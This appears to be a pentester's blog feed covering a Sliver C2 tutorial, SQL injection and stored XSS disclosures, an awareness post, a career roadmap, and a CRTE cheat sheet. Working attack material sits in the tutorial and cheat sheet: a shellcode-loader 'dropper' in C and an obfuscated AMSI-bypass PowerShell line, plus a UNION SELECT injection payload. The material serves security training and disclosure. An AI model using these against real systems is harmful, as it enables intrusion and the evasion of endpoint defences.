    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualProtect failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Create a new thread to execute shellcode</span>
    <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CreateThread failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Wait for the thread to finish</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>

    <span class="c1">// Clean up</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
    <span class="n">VirtualFree</span><span class="p">(</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<blockquote>
  <p>Run the Dropper to get a callback in your C2</p>
</blockquote>

<h2 id="armory">Armory</h2>

<p>Its the Extension Package Manager of Sliver which allows us to install tools that other people made</p>

<p>To show the packages available:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>armory
</code></pre></div></div>

<p>To install a pack:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>armory install seatbelt
</code></pre></div></div>

<p>Execute:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>armory -i -- -group=system
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/11.png" alt="Alt text" class="align-center" /></p>

<h2 id="bof-beacon-object-files">BOF: Beacon Object Files</h2>

<p>https://sliver.sh/docs?name=BOF+and+COFF+Support</p>

<h2 id="detection">Detection</h2>

<ul>
  <li>https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/</li>
  <li>https://www.youtube.com/watch?v=izMMmOaLn9g</li>
</ul>

<h3 id="shell">Shell</h3>

<p>remember the Session is in the currently running process, but the shell is different. Its easier to detect as we see in Windows Event:</p>

<h3 id="psexec--getsystem">psexec &amp; getsystem</h3>

<blockquote>
  <p>psexec works similar to impacket, it will run a binary from <strong>C:\Windows\Temp</strong> and give a random 10 char name</p>
</blockquote>

<blockquote>
  <p>getsystem is a macro that try to inject itself into another process <strong>spoolsv.exe</strong> (default) and abusing SeDebugPrivilege to get NT AUTHORITY\SYSTEM within that process (similar to meterpreter)</p>
</blockquote>

<h2 id="config-extraction-ir">Config Extraction (IR)</h2>

<p>The key is to extract the config that is stored in the implant</p>

<p>https://www.youtube.com/watch?v=FiT7-zxQGbo</p>

<ul>
  <li>
    <p>Most C2s will encrypt their config and obfuscate the code</p>
  </li>
  <li>
    <p>So the config has to be descrypted in-memory and then used</p>
  </li>
</ul>

<h2 id="references">References</h2>

<p>https://tishina.in/opsec/sliver-opsec-notes</p>

<p>https://dominicbreuker.com/post/learning_sliver_c2_01_installation/#series-overview</p>

<p>https://notateamserver.xyz/sliver-101/</p>]]></content><author><name>Nullified</name></author><category term="c2" /><category term="c2" /><category term="sliver" /><summary type="html"><![CDATA[Starting with Sliver C2]]></summary></entry><entry><title type="html">SQL Injection (SQLi)</title><link href="http://localhost:4000/cve/sqli/" rel="alternate" type="text/html" title="SQL Injection (SQLi)" /><published>2024-03-05T00:00:00+06:00</published><updated>2024-03-05T00:00:00+06:00</updated><id>http://localhost:4000/cve/sqli</id><content type="html" xml:base="http://localhost:4000/cve/sqli/"><![CDATA[<table>
  <tbody>
    <tr>
      <td>SQL Injection allows authenticated attackers to run unauthorized SQL commands, compromising systems by injecting malicious code into web forms, leading to access to sensitive data, manipulation of database contents, or even complete compromise of the system</td>
    </tr>
  </tbody>
</table>

<p>During the assessment, a SQL Injection vulnerability was found in MHA Systems.</p>

<p>Through the ‘<strong>Consulta/Executa</strong>’ field, followed by clicking on any of the listed options. This functionality allows us to query records in the database:</p>

<p><img src="/assets/images/posts/cve/images/5.png" alt="Alt text" class="align-center" /></p>

<p>It was identified that in any field of “<strong>Parâmetros</strong>” user input was not filtered. Because of this, our request is sent directly to the database query.</p>

<p>In this case, we inserted a single quote to test the error response:</p>

<p><img src="/assets/images/posts/cve/images/6.png" alt="Alt text" class="align-center" /></p>

<p>The error message states that “SQL was not finished correctly”. With this information at hand, we can proceed further with the tests.</p>

<p><img src="/assets/images/posts/cve/images/7.png" alt="Alt text" class="align-center" /></p>

<p>By changing the parameter to “<em>‘UNION SELECT 1,2,3;</em>”, the error message also changes to “<em>Keyword FROM was not found in the request</em>”</p>

<p><img src="/assets/images/posts/cve/images/8.png" alt="Alt text" class="align-center" /></p>

<p>With this last test, it was possible to retrieve some information from the database:</p>

<p><img src="/assets/images/posts/cve/images/9.png" alt="Alt text" class="align-center" /></p>

<p>To automate the exploration process, we utilized the tool <em>SQLMAP</em> to dump the tables of the database. As shown below, it reveals two types of payloads: Error-based and Time-based blind:</p>

<p><img src="/assets/images/posts/cve/images/10.png" alt="Alt text" class="align-center" /></p>

<p>Below are the results of the <em>DUMP</em>:</p>

<p><img src="/assets/images/posts/cve/images/11.png" alt="Alt text" class="align-center" /></p>

<p><img src="/assets/images/posts/cve/images/12.png" alt="Alt text" class="align-center" /></p>

<blockquote>
  <p>This vulnerability was discovered by two security researchers:</p>
</blockquote>

<ul>
  <li>João Silveira - <a href="https://MashrurRahmanRawnok.github.io">Nullified</a></li>
  <li>Leonardo Teodoro - <a href="https://squ4nch.github.io">SQU4NCH</a></li>
</ul>]]></content><author><name>Nullified</name></author><category term="cve" /><category term="cve" /><category term="web" /><summary type="html"><![CDATA[CVE-2024-2480]]></summary></entry><entry><title type="html">Stored cross-site scripting (XSS)</title><link href="http://localhost:4000/cve/xss/" rel="alternate" type="text/html" title="Stored cross-site scripting (XSS)" /><published>2024-03-05T00:00:00+06:00</published><updated>2024-03-05T00:00:00+06:00</updated><id>http://localhost:4000/cve/xss</id><content type="html" xml:base="http://localhost:4000/cve/xss/"><![CDATA[<table>
  <tbody>
    <tr>
      <td>Cross-Site Scripting leaves web apps vulnerable to script injections by authenticated users, risking session cookie theft, redirection to harmful sites, or unauthorized actions on behalf of users</td>
    </tr>
  </tbody>
</table>

<p>During the assessment, a Stored Cross-Site Scripting vulnerability was discovered in MHA Systems:</p>

<p>Through the ‘<strong>Consulta/Cadastro</strong>’ field, followed by clicking the ‘<strong>Novo</strong>’ button. This functionality allows us to create a new record:</p>

<p><img src="/assets/images/posts/cve/images/0.png" alt="Alt text" class="align-center" /></p>

<p>But as an attacker, it’s possible to inject malicious code into the ‘<strong>Query</strong>’ field:</p>

<p><img src="/assets/images/posts/cve/images/1.png" alt="Alt text" class="align-center" /></p>

<p>The code is interpreted and executed by the application, which in this case showcases an alert message.</p>

<p><img src="/assets/images/posts/cve/images/2.png" alt="Alt text" class="align-center" /></p>

<p>NOTE: The type of this Cross-Site Scripting is Stored. Bearing that in mind, it affects every user in the system.</p>

<blockquote>
  <p>This vulnerability was discovered by two security researchers:</p>
</blockquote>

<ul>
  <li>João Silveira - <a href="https://MashrurRahmanRawnok.github.io">Nullified</a></li>
  <li>Leonardo Teodoro - <a href="https://squ4nch.github.io">SQU4NCH</a></li>
</ul>]]></content><author><name>Nullified</name></author><category term="cve" /><category term="cve" /><category term="web" /><summary type="html"><![CDATA[CVE-2024-2479]]></summary></entry><entry><title type="html">Security Awareness</title><link href="http://localhost:4000/awareness/awarenessdoc/" rel="alternate" type="text/html" title="Security Awareness" /><published>2024-02-04T00:00:00+06:00</published><updated>2024-02-04T00:00:00+06:00</updated><id>http://localhost:4000/awareness/awarenessdoc</id><content type="html" xml:base="http://localhost:4000/awareness/awarenessdoc/"><![CDATA[<p>Hi, I’ve written a document covering various awareness topics such as passwords, Wi-Fi, home office, social media, and safe web browsing.</p>

<p>I will share the PDF here, and you can access the Word document on my GitHub (link below) to edit, add a cover image, and modify the company name accordingly.</p>

<p><a href="https://github.com/Nullified/SecurityAwareness">SecurityAwareness on GitHub</a></p>

<p><a href="https://github.com/Nullified/MashrurRahmanRawnok.github.io/raw/main/assets/images/posts/awareness/Security%20Awareness%20%5BEN%5D.docx">Download - Word Document</a></p>

<blockquote>
  <p>I hope this document helps raise awareness in the cyber community</p>
</blockquote>

<p><strong>Introduction</strong>:</p>

<p>Research suggests that human error is present in 90% of information leakage cases.
This guide aims to raise awareness among your employees and
consequently reduce the risk of data losses, information leaks, penalties, business and
resource losses, and, especially, the risk of damage to the company’s image and
reputation.</p>

<p>The issues presented in this guide address common errors observed in the daily
activities of employees in any company, such as those related to email access, internet
browsing, improper use of external devices, among others.
Therefore, we have included mandatory rules in this document that must be followed by
all employees working with company equipment and/or in their digital environments, as
well as recommendations for best practices to enhance the security of our technological
environment. “Company name” will continuously monitor compliance with the rules
and recommendations presented here.</p>

<p>PDF model:</p>

<embed src="https://MashrurRahmanRawnok.github.io/assets/images/posts/awareness/sec.pdf" type="application/pdf" width="100%" style="border: 1px solid #ccc;" />]]></content><author><name>Nullified</name></author><category term="awareness" /><category term="awareness" /><summary type="html"><![CDATA[Document to raise awareness of the security in your company]]></summary></entry><entry><title type="html">How to become a Pentester (2024)</title><link href="http://localhost:4000/insights/roadmap/" rel="alternate" type="text/html" title="How to become a Pentester (2024)" /><published>2024-01-01T00:00:00+06:00</published><updated>2024-01-01T00:00:00+06:00</updated><id>http://localhost:4000/insights/roadmap</id><content type="html" xml:base="http://localhost:4000/insights/roadmap/"><![CDATA[<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="roadmap-pentest---2024">Roadmap Pentest - 2024</h1>

<blockquote>
  <p>A lot of people asked me (<em>maybe 3</em> jk) So…</p>
</blockquote>

<p>Here’s <strong>my honest opinion</strong> in what’s the most <em>effective path to be a Pentester</em></p>

<!-- Courtesy of embedresponsively.com //-->
<div class="responsive-video-container">

  <iframe src="https://www.youtube-nocookie.com/embed/HkE83Zu8z58" frameborder="0" allowfullscreen=""></iframe>

</div>

<blockquote>
  <p>There is no “correct path”. Each one build its own path, because everyone has a different background</p>
</blockquote>

<p>IF you have no patience just click in the link below to go to the last chapter:</p>

<p><a href="https://MashrurRahmanRawnok.github.io/insights/roadmap/#summarizing">CHAPTER: Summarizing</a></p>

<p><img src="/assets/images/posts/insights/roadmap/2.png" alt="Alt text" class="align-center" /></p>

<h1 id="background">Background</h1>

<p>So lets speak about background - What I mean by this?</p>

<blockquote>
  <p><em>“First of all Pentest is like Bangladesh, not for beginners”</em> -Nullified</p>
</blockquote>

<ul>
  <li>Its recommended that you have a field of <em>expertise</em>.</li>
</ul>

<p>This field can vary from:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Network Admin
- Developer
- System Admin 
- Others
</code></pre></div></div>

<blockquote>
  <p>btw A complete beginner can start as an IT Support before choosing a more advanced field</p>
</blockquote>

<p>You may ask: <strong>Why a field before pentesting is important</strong>?</p>

<p>Its important cause it helps you be a good professional!</p>

<blockquote>
  <p><em>“Pentest is only fun if you are good enough to find stuff”</em></p>
</blockquote>

<p>You dont need to be an Expert in any of those, but a intermediate level gonna be helpful</p>

<h2 id="how-helpful">How Helpful?</h2>

<p>Pentest learns through the job, that means that u’ll Test a lot of technology that you’ve never seen before</p>

<ul>
  <li>And if you have knowledge in those fields, u’ll mix them with the curiosity and skills of breaking stuff</li>
</ul>

<p><strong>Networking</strong> is gonna be helpful to understand the infrastructure, to understand the defense mechanisms in order to be stealthy and consequently bypass the defense</p>

<p><strong>System admin</strong> gonna be helpful to know the commands, directories, patterns, important files, etc of a operational system (Unix, Windows, MacOS, etc)</p>

<p><strong>Developer</strong> from my point of view is the most helpful field, cause you’ll be a good web pentester, you’ll learn how to develop exploits much easier and be a great asset for the team because of that</p>

<blockquote>
  <p>Lets say you go directly to Pentest, Its ok too, but u’ll lack fundamentals and it’ll be much harder to learn stuff on the spot</p>
</blockquote>

<h2 id="build">BUILD</h2>

<p>Each professional will have these skills in rankings, just like a RPG!</p>

<p>Lets grab an Example:</p>

<table>
  <tbody>
    <tr>
      <td>Network</td>
      <td>Programming</td>
      <td>System</td>
    </tr>
    <tr>
      <td>★★★★☆</td>
      <td>★★☆☆☆</td>
      <td>★★★☆☆</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p>Not an Expert in any field, but have the fundamentals (or at least try to have)</p>
</blockquote>

<p>This is the professional <strong>BEFORE</strong> going to PENTEST!</p>

<p>Besides the fundamentals, a security professional will have a large set of skills, for example:</p>

<table>
  <tbody>
    <tr>
      <td>Fundamentals</td>
      <td>Audit</td>
      <td>Forensics</td>
      <td>Reverse Engineering</td>
      <td>Cyber Operation</td>
    </tr>
    <tr>
      <td>★★★★☆</td>
      <td>★★★☆☆</td>
      <td>★★☆☆☆</td>
      <td>★★★☆☆</td>
      <td>★★★★☆</td>
    </tr>
  </tbody>
</table>

<p>There is also the <em>SOFT SKILLS</em>:</p>

<ul>
  <li>Soft skills equals <em>Communication, Documentation and Leadership</em></li>
</ul>

<table>
  <tbody>
    <tr>
      <td>Fundamentals</td>
      <td>Audit</td>
      <td>Forensics</td>
      <td>Reverse Engineering</td>
      <td>Cyber Operation</td>
      <td>Soft Skills</td>
    </tr>
    <tr>
      <td>★★★★☆</td>
      <td>★★★☆☆</td>
      <td>★★☆☆☆</td>
      <td>★★★☆☆</td>
      <td>★★★★☆</td>
      <td>★★★☆☆</td>
    </tr>
  </tbody>
</table>

<p>And each topic has its owns sub-topics, for example:</p>

<table>
  <tbody>
    <tr>
      <td>Web</td>
      <td>API</td>
      <td>Mobile</td>
      <td>Active Directory</td>
      <td>Container</td>
      <td>Cloud</td>
      <td>Physical Pentest</td>
      <td>Low Level</td>
      <td>etc</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p>Thats your <strong>BUILD</strong>. Everybody likes different things, and thats good!</p>
</blockquote>

<blockquote>
  <p>Because a TEAM needs people with different set of skills and its <em>Impossible</em> to master everything (maybe not impossible, but lets say: <em>it takes a lot of time</em> )</p>
</blockquote>

<p>So, As you progress you’ll have a set of skills to “build your character”</p>

<blockquote>
  <p>Thats why the fundamentals are important</p>
</blockquote>

<h1 id="roadmap">Roadmap</h1>

<blockquote>
  <p><em>Enough of Chit-Chat</em></p>
</blockquote>

<p>OK, lets say you’re not a begginer and want to go from a Desktop Support to a Pentester (<em>developer, network admin, sys admin is even better as I said before</em>)</p>

<p><strong>What Do I recommend?</strong></p>

<blockquote>
  <p>4 Steps - straight to the point</p>
</blockquote>

<h2 id="1-learn-the-fundamentals">1. Learn the fundamentals</h2>

<blockquote>
  <p>(Basics of Security, Linux, Windows, Networking, one Programming language)</p>
</blockquote>

<ul>
  <li>You can learn the <strong>basics of Security</strong> from <strong>Security+</strong> CompTIA material</li>
  <li>You can learn <strong>Linux</strong> from <strong>LPIC-1</strong> LPI material or from <strong>Linux+</strong> CompTIA material</li>
  <li>You can learn <strong>Network</strong> from <strong>Network+</strong> CompTIA material</li>
  <li>You can learn <strong>Windows</strong> from <strong>Microsoft material</strong></li>
  <li>You can learn a <strong>Programming Language</strong> with <strong>freecodecamp</strong> or <strong>CodeAcademy</strong></li>
  <li>Plus - <em>Youtube</em> is a helpful resource for everything nowadays</li>
</ul>

<blockquote>
  <p>The programming language can be <em>Python, Ruby, C, C++, Javascript, C#, Java, PHP, etc</em> doesn’t matter - pick one that you like the most</p>
</blockquote>

<ul>
  <li>I say that doesn’t matter, because u’ll learn others throughout your journey anyway</li>
</ul>

<blockquote>
  <p>But if I could start again i’d choose <strong>C</strong> for internal and <strong>Javascript</strong> for external</p>
</blockquote>

<h3 id="where-to-learn-the-fundamentals">Where to learn the fundamentals?</h3>

<blockquote>
  <p>The best place to start in my opinion is <strong>TryHackMe</strong>. But here are some suggestions:</p>
</blockquote>

<ul>
  <li><a href="https://tryhackme.com/">TryHackMe</a></li>
  <li><a href="https://academy.hackthebox.com/">Hack The Box</a></li>
  <li><a href="https://www.vulnhub.com/">VulnHub</a></li>
  <li><a href="https://overthewire.org/wargames/">OverTheWire - Wargames</a></li>
</ul>

<h2 id="2-certifications">2. Certifications</h2>

<p>In my opinion Certifications are important because it gives u the material organized.</p>

<blockquote>
  <p>btw, it can be done without certifications, but it requires a <em>GREAT</em> organization and patience that I dont have</p>
</blockquote>

<blockquote>
  <p>Cause Sometimes you are saving money, but you are spending a lot of time to learn the same topic.</p>
</blockquote>

<blockquote>
  <p>Anyway Keep in mind: Balance is everything</p>
</blockquote>

<p>So, there is 2 types of certifications</p>

<ol>
  <li>The ones that you will use to <strong>LEARN</strong></li>
  <li>The ones that will help u to get a <strong>JOB</strong></li>
</ol>

<h3 id="in-my-opinion-the-best-path-is">In my opinion The best PATH is</h3>

<ol>
  <li>eJPT by INE</li>
  <li>One full practical pentest cert (eCPPT, PNPT, CPTS) - <strong>In my opinion, the best here are the two last ones (PNPT by TCM or CPTS by HackTheBox)</strong></li>
  <li>Get one cert to bypass HR + To get a JOB (OSCP, CEH) - These are the most asked, both are expensive and not great, but their purposes is to get you a job, <strong>I’d rather choose OSCP here</strong></li>
  <li>After that, choose a Field of specialization (Mobile, Container, IOT, Cloud security, Car hacking, WiFi hacking, Linux, Windows, Malware Development, etc) <strong>There are so many fields, choose one that u like the most</strong></li>
  <li>With XP, Certifications and a field of specialization in no time you’ll be a valuable asset for any company</li>
</ol>

<h2 id="3-job--experience">3. Job = Experience</h2>

<p>Its a bit tricky to get the first job in pentesting because everyone asks for experience, but how you are gonna get the xp in first place if nobody wanna hire you?</p>

<blockquote>
  <p><em>Nothing in this world is guaranteed</em>, but in my point of view</p>
</blockquote>

<p>If you:</p>

<ul>
  <li>Have worked in IT before,</li>
  <li>Are making connections on LinkedIn (this might be the most important),</li>
  <li>Hold some certifications (especially OSCP),</li>
  <li>Showcase your projects/GitHub on your LinkedIn/Socials</li>
</ul>

<p>You are on the right path to get a JOB in the offensive security field!</p>

<blockquote>
  <p><strong>If u r feeling like you’re sending ur resume into a black hole and getting zero love in return, you’re not alone.</strong></p>
</blockquote>

<p>Perhaps you need to get a job in cyber first:</p>

<ul>
  <li>SOC positions;</li>
  <li>Security Analyst;</li>
  <li>OSINT analyst</li>
  <li>etc</li>
</ul>

<p><strong>And then LATER switch to Pentest</strong>!</p>

<blockquote>
  <p>[NOTE] In your studies for Pentest, not only learn how to attack but also take some time to learn how to mitigate the vulnerability!</p>
</blockquote>

<p><img src="/assets/images/posts/insights/roadmap/5.png" alt="Alt text" class="align-center" /></p>

<h2 id="4-specialization">4. Specialization</h2>

<p>So, you’ve nailed that job – congrats! But here’s the thing, in OffSec, the learning never stops!</p>

<blockquote>
  <p>Start to think which specialization u are gonna choose. And go for it.</p>
</blockquote>

<p>Keep in mind that fields are inter-connected. For example:</p>

<p><strong>Windows</strong>:</p>

<ul>
  <li>If you have xp as Network Admin</li>
  <li>C#, Powershell, C as a language</li>
  <li>Active Directory</li>
  <li>good path for Windows specialization</li>
</ul>

<p><strong>Malware Developer</strong>:</p>

<ul>
  <li>Have XP as Developer</li>
  <li>Enjoys low level (assembly)</li>
  <li>Likes to do research</li>
  <li>good path for maldev</li>
</ul>

<p><strong>WEB</strong>:</p>

<ul>
  <li>Have IT xp</li>
  <li>Knows Javascript and PHP</li>
  <li>enjoy to do external pentesting</li>
  <li>can do bug bounty on free time</li>
  <li>good path for web</li>
</ul>

<blockquote>
  <p>These are only examples, as I said before: <em>u r gonna build ur own path</em></p>
</blockquote>

<blockquote>
  <p>Anyway</p>
</blockquote>

<p><img src="/assets/images/posts/insights/roadmap/3.png" alt="Alt text" class="align-center" /></p>

<p>What I trying to say is: U’ll get to a certain level that in order to not get stuck in ur career u gotta choose a specialization path</p>

<p>and every specialization has its own certifications/courses, for example:</p>

<p><strong>WINDOWS</strong>:</p>

<table>
  <tbody>
    <tr>
      <td>CRTP</td>
      <td>CRTE</td>
      <td>CRTO</td>
      <td>CRTM</td>
      <td>many others</td>
    </tr>
  </tbody>
</table>

<p><strong>WEB</strong>:</p>

<table>
  <tbody>
    <tr>
      <td>eWPT</td>
      <td>eWPTX</td>
      <td>OSWE</td>
      <td>BSCP</td>
      <td>many Others</td>
    </tr>
  </tbody>
</table>

<p><strong>MOBILE</strong>:</p>

<table>
  <tbody>
    <tr>
      <td>eMAPT</td>
      <td>PJMT</td>
      <td>8kSEC</td>
      <td>many others</td>
    </tr>
  </tbody>
</table>

<p><strong>Malware Development</strong>:</p>

<table>
  <tbody>
    <tr>
      <td>MalDev Academy</td>
      <td>Sektor7</td>
      <td>OSED</td>
      <td>many others</td>
    </tr>
  </tbody>
</table>

<p><strong>Cloud</strong>:</p>

<table>
  <tbody>
    <tr>
      <td>Altered Security</td>
      <td>CWL</td>
      <td>Cloud Breach</td>
      <td>HackTricks</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p>First, u gotta get a job, and then u can work towards the specialization you want</p>
</blockquote>

<ul>
  <li>There is a lot of others certs like - SANS (<em>expensive</em>), EC-Council (<em>expensive</em>) and More</li>
</ul>

<h1 id="summarizing">Summarizing</h1>

<ol>
  <li>Learn the Fundamentals (tryhackme/compTIA)</li>
  <li>Learn a programming language (Python)</li>
  <li>Take eJPT and PNPT</li>
  <li>Take OSCP (<em>If you have enough money</em>)</li>
  <li>Follow a specialization path</li>
  <li>Never stop learning</li>
</ol>

<p>In this site below u can find a lot of certifications for cybersecurity in General:</p>

<p><a href="https://pauljerimy.com/security-certification-roadmap/">Security Certification Roadmap</a></p>

<p><strong>What certs I recommend for PENTEST</strong>:</p>

<p><img src="/assets/images/posts/insights/roadmap/1.png" alt="Alt text" class="align-center" /></p>

<blockquote>
  <p><em>After that u can choose a specialization PATH</em></p>
</blockquote>

<ul>
  <li>with <em>OSCP</em> is easier to get a job, but lets say u dont want to spend that amount of money (like me)</li>
</ul>

<p>Then u can think of alternatives and jump for a specialization path (AD, WEB, MOBILE, etc):</p>

<p><img src="/assets/images/posts/insights/roadmap/6.png" alt="Alt text" class="align-center" /></p>

<h2 id="is-pentesting-worth-it">Is Pentesting Worth it?</h2>

<blockquote>
  <p>Honestly, it’s not a paradise, but if u keep studying it can be fun</p>
</blockquote>

<p>Positives:</p>

<ul>
  <li>It can be fun</li>
  <li>Never stop learning mindset</li>
  <li>The feeling when discovering something big</li>
  <li>AI won’t take over (at least not yet), because manual testing yields much better results</li>
  <li>The possibility of becoming a criminal at any time (joking here)</li>
</ul>

<p><img src="/assets/images/posts/insights/roadmap/7.gif" alt="Alt text" class="align-center" /></p>

<p>Some points to consider:</p>

<ul>
  <li>~<strong>40%</strong> of the job is documentation</li>
  <li>U need to keep studying forever (it gets tiring)</li>
  <li>You must be at least a bit communicative, because of <em>debriefing</em> (its when u show the results to clients)</li>
  <li>Sometimes the scope of projects is just a login page of a WordPress (<strong>angry face</strong>)</li>
  <li>It pays well <strong>only</strong> if u are a <strong><em>Senior</em></strong> - Until there…</li>
  <li>It’s hard to find a job in general because the majority of the jobs are for those who know how to harden/defend systems</li>
</ul>

<p><img src="/assets/images/posts/insights/roadmap/4.png" alt="Alt text" class="align-center" /></p>

<h2 id="expectation-x-reality">Expectation X Reality</h2>

<p><img src="/assets/images/posts/insights/roadmap/8.jpg" alt="Alt text" class="align-center" /></p>

<table>
  <tbody>
    <tr>
      <td>Expectation</td>
      <td>Reality</td>
    </tr>
    <tr>
      <td>It pays well</td>
      <td>Usually pays well if u work for a bank/big company e/or u are Senior level</td>
    </tr>
    <tr>
      <td>Its Fun, Its Dynamic</td>
      <td>Its actually boring, There’s a lot of bureaucracy involved with the tests (which is part of the job)</td>
    </tr>
    <tr>
      <td>You learn new stuff every day</td>
      <td>Not every day, most likely 5% of the time</td>
    </tr>
    <tr>
      <td>You are gonna hack all the time</td>
      <td>u hack 50% of the time, 40% is documentation, 5% is debriefing and 5% is meetings</td>
    </tr>
    <tr>
      <td>There’s a lack of professionals in the field</td>
      <td>There’s a lack of <em>SENIORS</em> in the field</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p>If after reading the negative points u are still interested in the field, You’ve passed the test!</p>
</blockquote>

<blockquote>
  <p>Go ahead and Good luck on ur journey!</p>
</blockquote>]]></content><author><name>Nullified</name></author><category term="insights" /><category term="tips" /><category term="pentest" /><summary type="html"><![CDATA[Roadmap Pentester (2024)]]></summary></entry><entry><title type="html">5 - Cheat Sheet</title><link href="http://localhost:4000/notes/crte/cheatsheet/" rel="alternate" type="text/html" title="5 - Cheat Sheet" /><published>2023-12-31T00:00:00+06:00</published><updated>2023-12-31T00:00:00+06:00</updated><id>http://localhost:4000/notes/crte/cheatsheet</id><content type="html" xml:base="http://localhost:4000/notes/crte/cheatsheet/"><![CDATA[<h1 id="cheat-sheet">Cheat Sheet</h1>

<p>As we know, these exams are time-based. So, I created this cheat sheet to make sure the syntax of the commands are correct and consequently I dont lose any time with BS.</p>

<blockquote>
  <p>The important part is to understand the content; the cheat sheet is just an <strong>auxiliary tool</strong> in the process.</p>
</blockquote>

<ul>
  <li>There is no hashes or informations of the exams here!</li>
</ul>

<blockquote>
  <p>Copy Button added - tell me what u think</p>
</blockquote>

<style>
  /* Style for the chapter container */
  .chapters {
    margin: 10px;
    padding: 10px;
    border: 1px solid #333;
    border-radius: 15px; 
    font-family: 'Arial', sans-serif;
    background-color: #1a1a1a;
    color: #ddd;
    width: calc(100% - 40px);
  }

  /* Style for the details summary */
  details summary {
    cursor: pointer;
    font-weight: bold;
    background-color: #333;
    padding: 12px;
    border: 1px solid #222;
    border-radius: 8px; 
    margin-bottom: 10px;
  }

  /* Style for the details content */
  details .content {
    margin: 20px 0;
    padding: 20px;
    border: 1px solid #222;
    border-radius: 8px; 
    background-color: #090a08;
  }

  
</style>

<div class="chapters">
  <details>
    <summary>Bypass</summary>    
    <div class="content">
      <p> </p>

      <p><strong>AMSI bypass</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-Item</span><span class="w"> </span><span class="p">(</span><span class="s1">'Va'</span><span class="o">+</span><span class="s1">'rI'</span><span class="o">+</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'blE:1'</span><span class="o">+</span><span class="s1">'q2'</span><span class="o">+</span><span class="s1">'uZx'</span><span class="p">)</span><span class="w"> </span><span class="p">([</span><span class="n">TYpE</span><span class="p">](</span><span class="s2">"F"</span><span class="o">+</span><span class="s1">'rE'</span><span class="p">))</span><span class="w"> 
</span><span class="p">(</span><span class="n">Get-variable</span><span class="w"> </span><span class="p">((</span><span class="s1">'1Q'</span><span class="o">+</span><span class="s1">'2U'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">'zX'</span><span class="p">))</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="s1">'Uti'</span><span class="o">+</span><span class="s1">'l'</span><span class="p">,</span><span class="s1">'A'</span><span class="p">,(</span><span class="s1">'Am'</span><span class="o">+</span><span class="s1">'si'</span><span class="p">),(</span><span class="s1">'.Man'</span><span class="o">+</span><span class="s1">'age'</span><span class="o">+</span><span class="s1">'men'</span><span class="o">+</span><span class="s1">'t.'</span><span class="p">),(</span><span class="s1">'u'</span><span class="o">+</span><span class="s1">'to'</span><span class="o">+</span><span class="s1">'mation.'</span><span class="p">),</span><span class="s1">'s'</span><span class="p">,(</span><span class="s1">'Syst'</span><span class="o">+</span><span class="s1">'em'</span><span class="p">)))</span><span class="o">.</span><span class="nf">g</span><span class="err">`</span><span class="n">etf</span><span class="se">`i</span><span class="nx">ElD</span><span class="s2">"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE</span><span class="se">`T`V</span><span class="s2">aLUE)(</span><span class="nv">${n`ULl}</span><span class="s2">,</span><span class="nv">${t`RuE}</span><span class="s2">)
</span></code></pre></div>      </div>

      <p><strong>Script Block logging bypass</strong>:</p>
